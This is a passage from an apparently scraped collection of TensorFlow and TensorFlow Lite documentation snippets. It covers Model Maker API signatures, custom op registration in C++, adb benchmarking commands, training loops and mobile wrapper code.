SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_3

LANGUAGE: python
CODE:
```
create_model()

```

----------------------------------------

TITLE: Enable TFLite Platform Tracing via ADB Shell
DESCRIPTION: This command enables TensorFlow Lite's platform tracing feature on the Android device by setting the system property 'debug.tflite.trace' to 1 using 'adb shell setprop'. This allows capturing detailed TFLite internal events in system traces.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/android/README.md#_snippet_7

LANGUAGE: Shell
CODE:
```
adb shell setprop debug.tflite.trace 1
```

----------------------------------------

TITLE: Defining Custom Operator Method Signatures (C++)
DESCRIPTION: Lists the function signatures for the core methods that a TFLite custom operator implementation can provide. These include methods for initialization (`Init`), deallocation (`Free`), shape propagation/validation (`Prepare`), execution (`Invoke`), and asynchronous kernel retrieval (`AsyncKernel`). `Prepare` and `Invoke` are typically required.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_7

LANGUAGE: C++
CODE:
```
// Initializes the op from serialized data.
void* Init(TfLiteOpaqueContext* context, const char* buffer, size_t length);

// Deallocates the op.
// The pointer `buffer` is the data previously returned by an Init invocation.
void Free(TfLiteOpaqueContext* context, void* buffer);

// Called when the inputs that this node depends on have been resized.
TfLiteStatus Prepare(TfLiteOpaqueContext* context, TfLiteOpaqueNode* node);

// Called when the node is executed. (Should read node inputs and write to
// node outputs).
TfLiteStatus Invoke(TfLiteOpaqueContext* context, TfLiteOpaqueNode* node);

// Retrieves the async kernel.
TfLiteAsyncKernel AsyncKernel(TfLiteOpaqueContext* context,
                              TfLiteOpaqueNode* node);
```

----------------------------------------

TITLE: Displaying Model Summary - TensorFlow Model Maker Python
DESCRIPTION: This method prints a summary of the model's architecture to the console, showing layers, output shapes, and parameter counts. It is useful for inspecting the model structure after creation. It takes no arguments and does not return a value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/Recommendation.md#_snippet_7

LANGUAGE: Python
CODE:
```
summary()
```

----------------------------------------

TITLE: Defining an Asynchronous Op Kernel Structure C++
DESCRIPTION: Demonstrates the basic structure of a custom asynchronous TensorFlow operation kernel in C++. It shows how to inherit from `AsyncOpKernel`, override the `ComputeAsync` method, handle errors asynchronously using `OP_REQUIRES_OK_ASYNC`, and delegate work to another function or method that calls the `done` callback upon completion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_0

LANGUAGE: c++
CODE:
```
class MyAsyncOp : public AsyncOpKernel {
 // â¦
  void ComputeAsync(OpKernelContext* ctx, DoneCallback done) override {
    // â¦
    OP_REQUIRES_OK_ASYNC(ctx, ErrorChecking(), done);
    // â¦
    // ScheduleOrRequest is pseudocode for scheduling or requesting work elsewhere
    ScheduleOrRequest(delegate, done /* , â¦ */ );
    // return quickly without waiting for the result
  }

}
void delegate(DoneCallback done /* , â¦ */ ) {
  // set output of op and/or do work of op
  // â¦
  done();
}
```

----------------------------------------

TITLE: Running Classifier Training with YamNetSpec [Python]
DESCRIPTION: Executes the training process for the provided model using the specified training and validation datasets for a given number of epochs. Additional keyword arguments can be passed to configure the training run.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/YamNetSpec.md#_snippet_6

LANGUAGE: python
CODE:
```
run_classifier(
    model, epochs, train_ds, validation_ds, **kwargs
)
```

----------------------------------------

TITLE: Running TFLite Benchmark App on Android - Shell
DESCRIPTION: Executes the TensorFlow Lite benchmark Android application on a connected device via `adb shell am start`. It specifies the app activity and passes benchmark arguments, including the required `--graph` parameter for the model file path and optional parameters like `--num_threads` for concurrency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/measurement.md#_snippet_1

LANGUAGE: Shell
CODE:
```
adb shell am start -S \
  -n org.tensorflow.lite.benchmark/.BenchmarkModelActivity \
  --es args '"--graph=/data/local/tmp/your_model.tflite \
              --num_threads=4"'
```

----------------------------------------

TITLE: Performing Inference Before Restore Python
DESCRIPTION: Performs an inference step using the 'infer' signature runner of a newly initialized interpreter. Since the restore signature hasn't been called yet, this inference uses the model's default initial weights, providing a baseline for comparison.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_18

LANGUAGE: python
CODE:
```
logits_before = infer(x=train_images[:1])['logits'][0]
```

----------------------------------------

TITLE: Running Training Steps with XLA-Compiled Function Python
DESCRIPTION: This code block executes the training loop. It iterates through batches provided by the `train_ds` dataset. In each iteration, it checks if the desired number of training steps (`TRAIN_STEPS`) has been reached using the optimizer's internal step counter (`optimizer.iterations`). If not, it calls the `train_mnist` function with the current batch of images and labels, triggering the compiled XLA execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/jit_compile.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
for images, labels in train_ds:
  if optimizer.iterations > TRAIN_STEPS:
    break
  train_mnist(images, labels)
```

----------------------------------------

TITLE: Building TFLite Micro Binary for Target Platform with Make | bash
DESCRIPTION: Builds a runnable binary for a specified project (`<project_name>_bin`) while targeting a specific hardware architecture (`TARGET=`) and potentially a sub-architecture (`TARGET_ARCH=`). This uses target-specific source files if available.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/library.md#_snippet_5

LANGUAGE: bash
CODE:
```
make -f tensorflow/lite/micro/tools/make/Makefile TARGET=cortex_m_generic TARGET_ARCH=cortex-m0 hello_world_bin
```

----------------------------------------

TITLE: Training the JAX Model
DESCRIPTION: Sets up training hyperparameters, defines a data stream to yield training batches, initializes a JAX momentum optimizer, defines a JIT-compiled function `update` for performing a single optimization step, and executes the training loop over multiple epochs, printing accuracy periodically.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_8

LANGUAGE: Python
CODE:
```
step_size = 0.001
num_epochs = 10
batch_size = 128
momentum_mass = 0.9


num_train = train_images.shape[0]
num_complete_batches, leftover = divmod(num_train, batch_size)
num_batches = num_complete_batches + bool(leftover)

def data_stream():
  rng = npr.RandomState(0)
  while True:
    perm = rng.permutation(num_train)
    for i in range(num_batches):
      batch_idx = perm[i * batch_size:(i + 1) * batch_size]
      yield train_images[batch_idx], train_labels[batch_idx]
batches = data_stream()

opt_init, opt_update, get_params = optimizers.momentum(step_size, mass=momentum_mass)

@jit
def update(i, opt_state, batch):
  params = get_params(opt_state)
  return opt_update(i, grad(loss)(params, batch), opt_state)

_, init_params = init_random_params(rng, (-1, 28 * 28))
opt_state = opt_init(init_params)
itercount = itertools.count()

print("\nStarting training...")
for epoch in range(num_epochs):
  start_time = time.time()
  for _ in range(num_batches):
    opt_state = update(next(itercount), opt_state, next(batches))
  epoch_time = time.time() - start_time

  params = get_params(opt_state)
  train_acc = accuracy(params, (train_images, train_labels))
  test_acc = accuracy(params, (test_images, test_labels))
  print("Epoch {} in {:0.2f} sec".format(epoch, epoch_time))
  print("Training set accuracy {}".format(train_acc))
  print("Test set accuracy {}".format(test_acc))
```

----------------------------------------

TITLE: Loading Dataset on Fragment View Creation - Kotlin
DESCRIPTION: Called when the fragment's view has been created, this function initializes a LoadDataSetClient to load the dataset from assets. If the dataset is loaded successfully, it extracts the list of passage titles for display or further processing within the fragment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/question_answer.md#_snippet_6

LANGUAGE: Kotlin
CODE:
```
class DatasetFragment : Fragment() {
 ...
 override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
 super.onViewCreated(view, savedInstanceState)
 val client = LoadDataSetClient(requireActivity())
 client.loadJson()?.let {
 titles = it.getTitles()
 }
 ...
 }
 ...
}
```

----------------------------------------

TITLE: Getting Average Word Embedding Model Spec in Python
DESCRIPTION: Retrieves the model specification for the 'average_word_vec' architecture using TensorFlow Lite Model Maker. This specification is used to configure data preprocessing and model training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
spec = model_spec.get('average_word_vec')
```

----------------------------------------

TITLE: Initializing TFLite ClassificationOptions Python
DESCRIPTION: Constructs a `ClassificationOptions` object used to configure the classification processor's behavior. It allows setting optional parameters like score thresholds, category allow/denylists, display name locale, and maximum number of results returned. These options override settings potentially provided in the model metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/ClassificationOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.processor.ClassificationOptions(
    score_threshold: Optional[float] = None,
    category_name_allowlist: Optional[List[str]] = None,
    category_name_denylist: Optional[List[str]] = None,
    display_names_locale: Optional[str] = None,
    max_results: Optional[int] = None
)
```

----------------------------------------

TITLE: Example Image Classification Result Format
DESCRIPTION: Displays a sample text output showing the structure of the classification results returned by the ImageClassifier API. It includes rank, index, score, class name, and display name for the top predictions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_classifier.md#_snippet_8

LANGUAGE: Text
CODE:
```
Results:
  Rank #0:
   index       : 671
   score       : 0.91406
   class name  : /m/01bwb9
   display name: Passer domesticus
  Rank #1:
   index       : 670
   score       : 0.00391
   class name  : /m/01bwbt
   display name: Passer montanus
  Rank #2:
   index       : 495
   score       : 0.00391
   class name  : /m/0bwm6m
   display name: Passer italiae
```

----------------------------------------

TITLE: Defining ObjC Wrapper Interface for TFLite BertQuestionAnswerer (Objective-C)
DESCRIPTION: Defines the public Objective-C interface for the TFLBertQuestionAnswerer class in the header (.h) file. This interface declares class methods for initializing the wrapper with model and vocabulary paths and instance methods for answering questions using context, including NS_SWIFT_NAME attributes for seamless Swift interoperability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/customized_task_api.md#_snippet_9

LANGUAGE: Objective-C
CODE:
```
@interface TFLBertQuestionAnswerer : NSObject

// Delegate calls to the native BertQuestionAnswerer::CreateBertQuestionAnswerer
+ (instancetype)mobilebertQuestionAnswererWithModelPath:(NSString*)modelPath
                                                vocabPath:(NSString*)vocabPath
          NS_SWIFT_NAME(mobilebertQuestionAnswerer(modelPath:vocabPath:));

// Delegate calls to the native BertQuestionAnswerer::Answer
- (NSArray<TFLQAAnswer*>*)answerWithContext:(NSString*)context
                                         question:(NSString*)question
          NS_SWIFT_NAME(answer(context:question:));
}
```

----------------------------------------

TITLE: Testing TFLite Model on Single Image Python
DESCRIPTION: This helper function tests a given TFLite model on a single specified test image index. It uses the `run_tflite_model` function to get the prediction and then displays the image using Matplotlib, showing the true label and the model's prediction in the title. It requires `matplotlib.pylab` for plotting.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_11

LANGUAGE: Python
CODE:
```
import matplotlib.pylab as plt

# Change this to test a different image
test_image_index = 1

## Helper function to test the models on one image
def test_model(tflite_file, test_image_index, model_type):
  global test_labels

  predictions = run_tflite_model(tflite_file, [test_image_index])

  plt.imshow(test_images[test_image_index])
  template = model_type + " Model \n True:{true}, Predicted:{predict}"
  _ = plt.title(template.format(true= str(test_labels[test_image_index]), predict=str(predictions[0])))
  plt.grid(False)
```

----------------------------------------

TITLE: Evaluating Quantized TFLite Model Accuracy Python
DESCRIPTION: Calls the evaluate_model helper function, passing the interpreter loaded with the dynamic range quantized TensorFlow Lite model. It then prints the returned accuracy score, allowing comparison with the float model's accuracy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_14

LANGUAGE: python
CODE:
```
print(evaluate_model(interpreter_quant))
```

----------------------------------------

TITLE: Preprocessing Text in AverageWordVecSpec
DESCRIPTION: Applies preprocessing steps to raw text, such as converting to lowercase if specified, tokenizing, and potentially handling unknown words or padding, based on the model's vocabulary and sequence length.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_8

LANGUAGE: python
CODE:
```
preprocess(
    raw_text
)
```

----------------------------------------

TITLE: Restoring TFLite Model Weights - Python
DESCRIPTION: Shows how to restore model weights from a checkpoint file using the `restore` signature runner in TFLite Python API. It takes the checkpoint path as input, requiring it as a NumPy string array. After restoring, it performs a test inference using the `infer` signature and compares the results, highlighting the effect of loading trained weights.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_19

LANGUAGE: Python
CODE:
```
# Restore the trained weights from /tmp/model.ckpt
restore(checkpoint_path=np.array("/tmp/model.ckpt", dtype=np.string_))

logits_after = infer(x=train_images[:1])['logits'][0]

compare_logits({'Before': logits_before, 'After': logits_after})
```

----------------------------------------

TITLE: Initializing EfficientDetSpec Class - Python
DESCRIPTION: This snippet shows the constructor signature for the `EfficientDetSpec` class in `tflite_model_maker.object_detector`. It is used to define the configuration and hyperparameters for training and exporting an EfficientDet object detection model. Key parameters include the model name, source URI, training epochs, batch size, and distribution strategy settings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/EfficientDetSpec.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_model_maker.object_detector.EfficientDetSpec(
    model_name: str,
    uri: str,
    hparams: str = '',
    model_dir: Optional[str] = None,
    epochs: int = 50,
    batch_size: int = 64,
    steps_per_execution: int = 1,
    moving_average_decay: int = 0,
    var_freeze_expr: str = '(efficientnet|fpn_cells|resample_p6)',
    tflite_max_detections: int = 25,
    strategy: Optional[str] = None,
    tpu: Optional[str] = None,
    gcp_project: Optional[str] = None,
    tpu_zone: Optional[str] = None,
    use_xla: bool = False,
    profile: bool = False,
    debug: bool = False,
    tf_random_seed: int = 111111,
    verbose: int = 0
) -> None
```

----------------------------------------

TITLE: Initializing DataLoader Class (Python)
DESCRIPTION: Initializes the DataLoader for the Searcher task. It can optionally take a path to a TFLite embedder model, an existing embedding dataset (numpy array), and corresponding metadata (list of strings). If the dataset is not provided, it will be generated later.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/DataLoader.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.searcher.DataLoader(
    embedder_path: Optional[str] = None,
    dataset: Optional[np.ndarray] = None,
    metadata: Optional[List[AnyStr]] = None
) -> None
```

----------------------------------------

TITLE: Defining Simple Lambda for AutoGraph Parsing (Python)
DESCRIPTION: This snippet shows the recommended pattern for defining a lambda function when using TensorFlow AutoGraph. Defining the lambda in a simple assignment (`l = lambda ...`) makes it easier for AutoGraph to parse the function's source code, helping to avoid the 'Unable to identify source code of lambda function' error that can occur with more complex inline lambda expressions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/common_errors.md#_snippet_4

LANGUAGE: Python
CODE:
```
l = lambda <args>: <body>
```

----------------------------------------

TITLE: Converting Text Examples to Features in TensorFlow
DESCRIPTION: Converts raw text examples into input features suitable for model training or evaluation and writes them into a TFRecord file format. Requires examples, training flag, output function, and batch size.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_2

LANGUAGE: python
CODE:
```
convert_examples_to_features(
    examples, is_training, output_fn, batch_size
)

```

----------------------------------------

TITLE: Executing TFLite Model with Custom Text Ops (Python)
DESCRIPTION: This helper function demonstrates how to run inference using a TensorFlow Lite model that includes custom TensorFlow Text operations. It initializes InterpreterWithCustomOps, registers the necessary custom ops, retrieves the 'serving_default' signature runner, and executes the model with a given prompt. It requires the TensorFlow Lite runtime with custom op support and the TensorFlow Text library registrar.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/auto_complete/overview.md#_snippet_2

LANGUAGE: python
CODE:
```
def run_inference(input, generate_tflite):
    interp = interpreter.InterpreterWithCustomOps(
        model_content=generate_tflite,
        custom_op_registerers=
            tf_text.tflite_registrar.SELECT_TFTEXT_OPS
    )

    interp.get_signature_list()

    generator = interp.get_signature_runner('serving_default')
    output = generator(prompt=np.array([input]))
```

----------------------------------------

TITLE: Parsing Argument Types and Counts in TensorFlow GraphDef Importer C++
DESCRIPTION: This C++ function, `GraphDefImporter::ArgNumType`, is responsible for parsing operation attributes to determine the number and types of arguments. It inspects `type_list_attr`, `number_attr`, `type`, and `type_attr` fields within the `OpDef::ArgDef` and corresponding values in the `NamedAttrList` to populate the `types` vector and return the argument count. This function operates within the TensorFlow GraphDef importer for MLIR.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-140.md#_snippet_0

LANGUAGE: cpp
CODE:
```
StatusOr<unsigned> GraphDefImporter::ArgNumType(const NamedAttrList &attrs,
                                                const OpDef::ArgDef &arg_def,
                                                SmallVectorImpl<Type> &types) {
  // Check whether a type list attribute is specified.
  if (!arg_def.type_list_attr().empty()) {
    if (auto v = attrs.get(arg_def.type_list_attr()).dyn_cast<ArrayAttr>()) {
      for (Attribute attr : v) {
        if (auto dtype = attr.dyn_cast<TypeAttr>()) {
          types.push_back(UnrankedTensorType::get(dtype.getValue()));
        } else {
          return InvalidArgument("Expected '", arg_def.type_list_attr(),
                                 "' to be a list of types");
        }
      }
      return v.size();
    }
    return NotFound("Type attr not found: ", arg_def.type_list_attr());
  }

  unsigned num = 1;
  // Check whether a number attribute is specified.
  if (!arg_def.number_attr().empty()) {
    if (auto v = attrs.get(arg_def.number_attr()).dyn_cast<IntegerAttr>()) {
      num = v.getValue().getZExtValue();
    } else {
      return NotFound("Type attr not found: ", arg_def.number_attr());
    }
  }

  // Check for a type or type attribute.
  Type dtype;
  if (arg_def.type() != DataType::DT_INVALID) {
    TF_RETURN_IF_ERROR(ConvertDataType(arg_def.type(), b_, &dtype));
  } else if (arg_def.type_attr().empty()) {
    return InvalidArgument("Arg '", arg_def.name(),
                           "' has invalid type and no type attribute");
  } else {
    if (auto v = attrs.get(arg_def.type_attr()).dyn_cast<TypeAttr>()) {
      dtype = v.getValue();
    } else {
      return NotFound("Type attr not found: ", arg_def.type_attr());
    }
  }
  types.append(num, UnrankedTensorType::get(dtype));
  return num;
}
```

----------------------------------------

TITLE: Disallowed Mixed Tensor Python Break in While Loop Python
DESCRIPTION: An example demonstrating a disallowed pattern in AutoGraph: using a Python conditional (`while True`) combined with a Tensor-dependent `break` (`if tf.equal(x, 0): break`). This will raise an error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_31

LANGUAGE: Python
CODE:
```
@tf.function
def buggy_while_py_true_tf_break(x):
  while True:   # python conditional
    if tf.equal(x, 0): # tensor break
      break
    x -= 1
  return x
```

----------------------------------------

TITLE: Creating Python Wrapper for Custom Op
DESCRIPTION: This Python function serves as the public API for the custom multiplex op, providing a user-friendly interface and a comprehensive docstring. It wraps the underlying generated op function (`gen_multiplex_1_op.examples1_multiplex_dense`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_7

LANGUAGE: python
CODE:
```
def multiplex(cond, a, b, name=None):
  """Return elements chosen from `a` or `b` depending on `cond`.\n\n  This is similar to `np.where` and `tf.where`, but simplified to only handle\n  the case of dense tensors, no optional parameters, no broadcasting, etc..\n\n  >>> multiplex([True, False, False, True], [1,2,3,4], [100,200,300,400])\n  <tf.Tensor: shape=(4,), dtype=int32, numpy=array([  1, 200, 300,   4], ...)>\n\n  Args:\n    cond: tf.Tensor of type bool. Where True, yield `a`, otherwise yield `b`.\n    a: tf.Tensor with the same type and shape as `b`.\n    b: tf.Tensor with the same type and shape as `a`.\n    name: An optional name for the op.\n\n  Returns:\n    A tf.Tensor with elements from `a` where `cond` is True, and elements\n    from `b` elsewhere.\n  """
  return gen_multiplex_1_op.examples1_multiplex_dense(
      cond=cond, a_values=a, b_values=b, name=name)
```

----------------------------------------

TITLE: Identifying Unique Characters (Vocabulary) - Python
DESCRIPTION: This snippet finds all the unique characters present in the text and sorts them to create the vocabulary. The size of this vocabulary determines the number of possible character inputs and outputs for the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
vocab = sorted(set(text))
print ('{} unique characters'.format(len(vocab)))
```

----------------------------------------

TITLE: Defining Keras LSTM Model Python
DESCRIPTION: This code block defines a Keras Sequential model for MNIST classification, consisting of an Input layer, a fused LSTM layer, a Flatten layer, and a Dense output layer with softmax activation. It then compiles the model using the Adam optimizer and sparse categorical crossentropy loss, and prints a summary of the model architecture and parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/experimental_new_converter/Keras_LSTM_fusion_Codelab.ipynb#_snippet_2

LANGUAGE: Python
CODE:
```
model = tf.keras.models.Sequential([
    tf.keras.layers.Input(shape=(28, 28), name='input'),
    tf.keras.layers.LSTM(20, time_major=False, return_sequences=True),
    tf.keras.layers.Flatten(),
    tf.keras.layers.Dense(10, activation=tf.nn.softmax, name='output')
])
model.compile(optimizer='adam',
              loss='sparse_categorical_crossentropy',
              metrics=['accuracy'])
model.summary()
```

----------------------------------------

TITLE: Configuring Gradle for BertNLClassifier in Java
DESCRIPTION: This snippet shows how to modify an Android module's build.gradle file. It includes adding the TensorFlow Lite Task Text library dependency and optionally configuring aaptOptions to prevent .tflite model files from being compressed within the application package.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_nl_classifier.md#_snippet_0

LANGUAGE: gradle
CODE:
```
android {
    // Other settings

    // Specify tflite file should not be compressed for the app apk
    aaptOptions {
        noCompress "tflite"
    }

}

dependencies {
    // Other dependencies

    // Import the Task Text Library dependency (NNAPI is included)
    implementation 'org.tensorflow:tensorflow-lite-task-text:0.4.4'
}
```

----------------------------------------

TITLE: Evaluating TFLite Object Detector Model Python
DESCRIPTION: Evaluates the performance of the exported TensorFlow Lite model using the `model.evaluate_tflite` method on the test dataset. This step allows comparing the TFLite model's accuracy against the original TensorFlow model, considering effects of quantization and different post-processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
model.evaluate_tflite('model.tflite', test_data)
```

----------------------------------------

TITLE: Pushing TensorFlow Graph File to Android Device via ADB
DESCRIPTION: This command transfers a TensorFlow graph file (e.g., tensorflow_inception_graph.pb) from the local filesystem to a temporary directory on the connected Android device using adb. This file contains the model to be benchmarked.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/benchmark/README.md#_snippet_2

LANGUAGE: Bash
CODE:
```
adb push tensorflow_inception_graph.pb /data/local/tmp
```

----------------------------------------

TITLE: Registering SimpleHashTableFind Op - TensorFlow C++
DESCRIPTION: Registers a TensorFlow custom operation named "Examples>SimpleHashTableFind". This op takes a resource handle, a key, and a default value as input and outputs the value associated with the key. It requires `key_dtype` and `value_dtype` attributes to specify the types and also uses them for input/output types. `SetShapeFn(ThreeScalarInputsScalarOutput)` indicates the expected input/output shapes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_4

LANGUAGE: C++
CODE:
```
REGISTER_OP("Examples>SimpleHashTableFind")
    .Input("resource_handle: resource")
    .Input("key: key_dtype")
    .Input("default_value: value_dtype")
    .Output("value: value_dtype")
    .Attr("key_dtype: type")
    .Attr("value_dtype: type")
    .SetShapeFn(ThreeScalarInputsScalarOutput);
```

----------------------------------------

TITLE: Creating Recommendation Model Python
DESCRIPTION: This method is part of the `ModelSpec` class and is responsible for constructing the Keras model based on the provided input and model hyperparameters defined during initialization. It returns the generated Keras model instance, ready for training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/ModelSpec.md#_snippet_1

LANGUAGE: python
CODE:
```
create_model()
```

----------------------------------------

TITLE: Creating MetadataDisplayer from Model Buffer in Python
DESCRIPTION: Defines the class method signature for `with_model_buffer`. This alternative constructor creates a `MetadataDisplayer` object by directly processing a TFLite model provided as a bytearray buffer. It returns the initialized `MetadataDisplayer` instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataDisplayer.md#_snippet_5

LANGUAGE: python
CODE:
```
@classmethod
with_model_buffer(
    model_buffer
)
```

----------------------------------------

TITLE: Implementing Custom Loss Function Python
DESCRIPTION: This Python code defines a custom loss function (`loss_fn`) equivalent to `tf.keras.losses.sparse_categorical_crossentropy`. It uses a one-hot helper function and `tf.nn.log_softmax` to calculate the negative log-likelihood loss.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_28

LANGUAGE: python
CODE:
```
def one_hot(labels, n):
  return (labels[..., np.newaxis] == tnp.arange(n)).astype(np.float32)

def loss_fn(labels, predictions):
  predictions = tf.nn.log_softmax(predictions)
  return -tnp.sum(predictions * one_hot(tnp.asarray(labels), predictions.shape[-1]), axis=-1)
```

----------------------------------------

TITLE: Registering Custom Multiplexer Op Interface in C++
DESCRIPTION: Registers the custom multiplexer operation (`Examples1>MultiplexDense`) with TensorFlow. It defines three inputs (`cond: bool`, `a_values: T`, `b_values: T`), one output (`output_values: T`), an attribute `T: type`, a shape inference function, and documentation. The shape function asserts that all inputs have the same shape.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_3

LANGUAGE: c++
CODE:
```
REGISTER_OP("Examples1>MultiplexDense")
    .Input("cond: bool")
    .Input("a_values: T")
    .Input("b_values: T")
    .Output("output_values: T")
    .Attr("T: type")
    .SetShapeFn([](tensorflow::shape_inference::InferenceContext* c) {
      // Determine the output shape and also assert that inputs 0 and 1 have
      // the same shape.
      tensorflow::shape_inference::ShapeHandle out;
      TF_RETURN_IF_ERROR(c->Merge(c->input(0), c->input(1), &out));
      // Assert that inputs 0 and 2 have the same shape, i.e. that all inputs
      // have the same shape. This is optional, but it is desirable
      // to raise errors about inconsistent input shapes early when using
      // graph mode.
      tensorflow::shape_inference::ShapeHandle unused;
      TF_RETURN_IF_ERROR(c->Merge(c->input(0), c->input(2), &unused));

      c->set_output(0, out);
      return ::tensorflow::OkStatus();
    })
    .Doc(R"doc(
Return elements chosen from `a` or `b` depending on `cond`.

This is similar to `np.where` and `tf.where`, but simplified to only handle
the case of dense tensors, no optional parameters, no broadcasting, etc..

cond: tf.Tensor of type bool.
a_values: tf.Tensor with the same type and shape as `b_values`.
b_values: tf.Tensor with the same type and shape as `a_values`.

      Where True, yield `a_values`, otherwise yield `b_values`.
output_values: A tf.Tensor with elements from `a` where `cond` is True, and
               elements from `b` elsewhere.
)doc");
```

----------------------------------------

TITLE: Import TFLite Header (Objective-C)
DESCRIPTION: Imports the TensorFlowLite umbrella header into an Objective-C source file using the traditional import syntax.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ios.md#_snippet_10

LANGUAGE: Objective-C
CODE:
```
#import "TFLTensorFlowLite.h"
```

----------------------------------------

TITLE: Running TFLite Buffer Stripping Tool (Shell)
DESCRIPTION: This command uses Bazel to execute the `strip_buffers_from_fb` tool, which removes eligible constant data from an input TFLite flatbuffer to reduce its size. It requires specifying the path to the input flatbuffer and the desired path for the output stripped flatbuffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/strip_buffers/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
bazel run -c opt tensorflow/lite/tools/strip_buffers:strip_buffers_from_fb -- --input_flatbuffer=/input/path.tflite --output_flatbuffer=/output/path.tflite
```

----------------------------------------

TITLE: Defining TensorFlow Custom Op Interface (C++)
DESCRIPTION: Registers the custom TensorFlow op "Examples>MultiplexDense" using the `REGISTER_OP` macro. It defines inputs (`cond`, `a_values`, `b_values`) and output (`output_values`), allowing for single tensors or lists of tensors using the `N*` syntax and an integer attribute `N` with a default of 1 for backward compatibility. It also specifies type (`T`) and sets a shape function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_4/README.md#_snippet_1

LANGUAGE: C++
CODE:
```
REGISTER_OP("Examples>MultiplexDense")
    .Input("cond: N * bool")
    .Input("a_values: N * T")
    .Input("b_values: T")
    .Output("output_values: T")
    .Attr("T: type")
    .Attr("N: int = 1")
    .SetShapeFn(MultiplexShapeFunction)
    .Doc(R"doc(
Return elements chosen from `a_values` or `b_values` depending on `cond`.

When `a_values` and `cond` are tenors (i.e. N=1), this is similar to `np.where`
and `tf.where`. When `a_values` and `cond` are lists of tensors (i.e. N>1),
this is similar to `np.select`. In either case these are simplified to only
